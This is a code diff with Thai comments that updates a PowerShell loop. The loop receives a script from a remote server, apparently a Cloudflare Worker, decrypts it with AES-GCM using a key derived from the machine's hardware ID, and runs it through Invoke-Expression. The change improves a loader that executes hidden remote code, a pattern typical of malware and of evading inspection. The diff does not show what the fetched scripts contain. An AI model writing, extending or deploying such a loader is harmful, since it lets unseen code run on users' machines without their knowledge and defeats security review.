@@ -131,39 +131,43 @@ while ($true) {
             
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
-                    function Decrypt-Payload($encDataHex, $ivHex, $hwid) {
-                        $aes = [System.Security.Cryptography.Aes]::Create()
-                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                    # 💡 ฟังก์ชันถอดรหัส AES-GCM ให้ตรงกับฝั่ง Cloudflare Worker (.NET Core / PowerShell 7+)
+                    function Decrypt-Payload-GCM($encDataHex, $ivHex, $hwid) {
+                        # แปลง HWID เป็น Key 32 ไบต์
+                        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
                         
-                        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
-                        
-                        # ตรวจสอบและปรับขนาด IV ให้ครบ 16 ไบต์ (32 ตัวอักษร)
-                        if ($ivHex.Length -gt 32) { $ivHex = $ivHex.Substring(0, 32) }
-                        elseif ($ivHex.Length -lt 32) { $ivHex = $ivHex.PadRight(32, '0') }
-
-                        $ivBytes = New-Object byte[] 16
-                        for ($i = 0; $i -lt 32; $i += 2) {
+                        # แปลง IV จาก Hex เป็น Byte Array (12 ไบต์สำหรับ GCM)
+                        $ivBytes = New-Object byte[] ($ivHex.Length / 2)
+                        for ($i = 0; $i -lt $ivHex.Length; $i += 2) {
                             $ivBytes[$i / 2] = [Convert]::ToByte($ivHex.Substring($i, 2), 16)
                         }
-                        $aes.IV = $ivBytes
-                        
-                        # ตรวจสอบความยาวข้อมูล Hex ให้เป็นเลขคู่เสมอ
-                        if (($encDataHex.Length % 2) -ne 0) {
-                            $encDataHex += "0"
+
+                        # แปลงข้อมูล Encrypted จาก Hex เป็น Byte Array
+                        $fullCipher = New-Object byte[] ($encDataHex.Length / 2)
+                        for ($i = 0; $i -lt $encDataHex.Length; $i += 2) {
+                            $fullCipher[$i / 2] = [Convert]::ToByte($encDataHex.Substring($i, 2), 16)
                         }
 
-                        $cipherBytes = New-Object byte[] ($encDataHex.Length / 2)
-                        for ($i = 0; $i -lt $encDataHex.Length; $i += 2) {
-                            $cipherBytes[$i / 2] = [Convert]::ToByte($encDataHex.Substring($i, 2), 16)
-                        }
+                        # แยก Auth Tag ออกจากท้ายข้อมูล (AES-GCM ของ Web Crypto API จะพ่วง Tag 16 ไบต์สุดท้ายมาด้วย)
+                        $tagSize = 16
+                        $cipherTextSize = $fullCipher.Length - $tagSize
                         
-                        $decryptor = $aes.CreateDecryptor()
-                        $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
+                        $cipherBytes = New-Object byte[] $cipherTextSize
+                        $tagBytes = New-Object byte[] $tagSize
+                        
+                        [System.Array]::Copy($fullCipher, 0, $cipherBytes, 0, $cipherTextSize)
+                        [System.Array]::Copy($fullCipher, $cipherTextSize, $tagBytes, 0, $tagSize)
+
+                        $plainBytes = New-Object byte[] $cipherTextSize
+
+                        # ใช้ AesGcm ในการถอดรหัส
+                        $aesGcm = [System.Security.Cryptography.AesGcm]::new($keyBytes)
+                        $aesGcm.Decrypt($ivBytes, $cipherBytes, $tagBytes, $plainBytes)
+
                         return [System.Text.Encoding]::UTF8.GetString($plainBytes)
                     }
 
-                    $decryptedScript = Decrypt-Payload $scriptResponse.data $scriptResponse.iv $userHwid
+                    $decryptedScript = Decrypt-Payload-GCM $scriptResponse.data $scriptResponse.iv $userHwid
                     Invoke-Expression $decryptedScript
                 } else {
                     Invoke-Expression $scriptResponse.script
